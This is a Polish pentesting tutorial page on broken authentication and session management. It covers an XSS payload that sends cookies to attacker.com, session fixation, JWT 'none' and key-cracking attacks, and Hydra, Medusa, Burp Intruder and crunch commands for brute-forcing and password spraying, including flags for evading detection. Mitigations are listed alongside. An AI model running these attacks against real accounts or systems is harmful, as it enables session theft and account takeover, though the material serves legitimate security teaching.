---
id: "broken-authentication"
title: "Broken Authentication & Session Management"
sidebar_position: 9
---

# Broken Authentication & Session Management

Luki w uwierzytelnianiu i zarządzaniu sesjami umożliwiają atakującym przejęcie kont użytkowników, odczytanie sesji, a nawet eskalację uprawnień. W tej sekcji omówimy najczęstsze ataki oraz sposoby ich przeprowadzania.

---

## 🎭 Ataki na sesje użytkowników (JWT, Cookies)

### **1️⃣ Ataki na Cookies**
Pliki cookie zawierają dane sesyjne użytkownika i mogą być celem ataku.

#### **Odczytanie cookies w przeglądarce**
W konsoli przeglądarki (F12 → Console):
```javascript
document.cookie
```

#### **Kradzież sesji przez XSS**
Jeśli aplikacja jest podatna na XSS, można wykraść sesję użytkownika:
```javascript
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

#### **Modyfikacja sesji (Session Fixation)**
Jeśli aplikacja nie zmienia ID sesji po zalogowaniu, atakujący może wymusić użycie konkretnej sesji:
```http
Set-Cookie: PHPSESSID=attackerSession; path=/; HttpOnly
```

Zabezpieczenia:
- **Używanie HttpOnly i Secure cookies**
- **Regeneracja ID sesji po zalogowaniu**
- **Ustawienie polityki SameSite dla ochrony przed CSRF**

---

### **2️⃣ Ataki na JWT (JSON Web Tokens)**
JWT są często używane do autoryzacji, ale mogą być podatne na ataki.

#### **Brak podpisu JWT**
Jeśli aplikacja akceptuje niepodpisane JWT, można podmienić payload:
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Przykładowe narzędzie do dekodowania JWT:
```bash
jwt_tool token_here -d
```

#### **Podatność na atak Brute-force algorytmu HS256**
Jeśli klucz podpisujący JWT jest słaby, można go złamać:
```bash
jwtcrack mytoken.jwt
```

Zabezpieczenia:
- **Używanie silnego klucza podpisującego JWT**
- **Ustawienie krótkiego czasu życia tokenów**
- **Odrzucanie niepodpisanych JWT**

---

## 🔑 Bruteforce i ataki na hasła (Hydra, Burp Intruder)

### **1️⃣ Atak bruteforce na logowanie (Hydra)**
Hydra umożliwia atakowanie formularzy logowania metodą siłową.

#### **Bruteforce logowania HTTP POST**
```bash
hydra -l admin -P passwords.txt example.com http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```
Opcje:
- `-l admin` – login użytkownika
- `-P passwords.txt` – lista haseł
- `http-post-form` – atak na formularz POST

#### **Bruteforce na SSH**
```bash
hydra -l root -P passwords.txt ssh://192.168.1.10
```

Zabezpieczenia:
- **Ograniczenie liczby nieudanych prób logowania**
- **Uwierzytelnianie wieloskładnikowe (MFA)**
- **Blokowanie podejrzanych adresów IP**

---

### **2️⃣ Atak brute-force przy użyciu Burp Intruder**
Burp Suite Intruder pozwala na ataki słownikowe na formularze logowania.

#### **Konfiguracja ataku**
1. Przechwyć żądanie logowania w Burp Suite.
2. Przekieruj je do zakładki `Intruder` → `Positions`.
3. Ustaw `§` wokół parametrów `username` i `password`.
4. Wybierz `Payloads` → dodaj listę loginów i haseł.
5. Uruchom atak i sprawdź, które odpowiedzi różnią się od pozostałych.

Zabezpieczenia:
- **Wprowadzenie CAPTCHA**
- **Opóźnienia po nieudanych próbach logowania**
- **Monitorowanie nietypowego ruchu logowania**

---

## 🌊 Password Spraying

Klasyczny brute-force (wiele haseł dla jednego konta) łatwo wykryć i zablokować account lockoutem. **Password spraying** odwraca logikę: jedno popularne hasło testowane przeciw wielu kontom — poniżej progu blokady per konto.

```bash
# Hydra – spray jednego hasła na listę loginów
hydra -L users.txt -p 'Winter2024!' example.com http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=incorrect" -t 1 -w 30
```

Flagi `-t 1 -w 30` (1 wątek, 30 s przerwa) spowalniają ruch, żeby nie wyzwolić alertów. Dobre hasła do sprayingu: `Season+rok`, `Firma123!`, `Welcome1`.

---

##  Medusa – brute-force z kontrolą hałasu

Medusa to alternatywa dla Hydry z przydatnymi flagami do ograniczania hałasu:

```bash
# -e ns: testuj też puste hasło (n) i login=hasło (s)
# -F: zatrzymaj się po pierwszym trafieniu
medusa -h 192.168.1.10 -U users.txt -P passwords.txt -M http \
  -m DIR:/login -e ns -F
```

Parametry:
- `-e ns` — dodatkowo sprawdza login bez hasła i login jako hasło
- `-F` — stop po pierwszym sukcesie (cichy, szybki atak)
- `-M ssh` / `-M ftp` — moduły dla innych protokołów

---

##  Generowanie słowników (crunch)

Gdy znasz politykę haseł (długość, zestaw znaków), crunch generuje precyzyjny słownik zamiast pobierania generycznych list:

```bash
# hasła 8 znaków z liter i cyfr
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt

# wzorzec: wielka, 5 małych, 2 cyfry (np. Klient01)
crunch 8 8 -t @@@@@@@@ -p ABCDEFGHIJKLMNOPQRSTUVWXYZ \
  abcdefghijklmnopqrstuvwxyz 0123456789
```

Przydatne gdy cel ma niestandardową politykę — rockyou.txt będzie zbyt duże i zbyt przypadkowe.

---

## ⚠️ Online vs offline — kiedy uważać

| Atak | Gdzie | Ryzyko detekcji | Limit szybkości |
|------|-------|-----------------|-----------------|
| Brute-force HTTP | sieć / aplikacja | **Wysoki** — logi, WAF, lockout | rate limit, captcha |
| Password spraying | sieć / aplikacja | **Średni** (wolny) | lockout per konto |
| Hashcat/John | lokalnie | **Brak** — offline | tylko sprzęt |

Zawsze ustal z klientem limit prób przed testem online — agresywny brute może zablokować konta produkcyjne. Po przekroczeniu progu lockoutu atak staje się incydentem DoS.

---

Podatności w uwierzytelnianiu są jednym z najpoważniejszych zagrożeń dla aplikacji webowych. Kolejnym krokiem będzie analiza podatności **Cross-Site Scripting (XSS)**! 
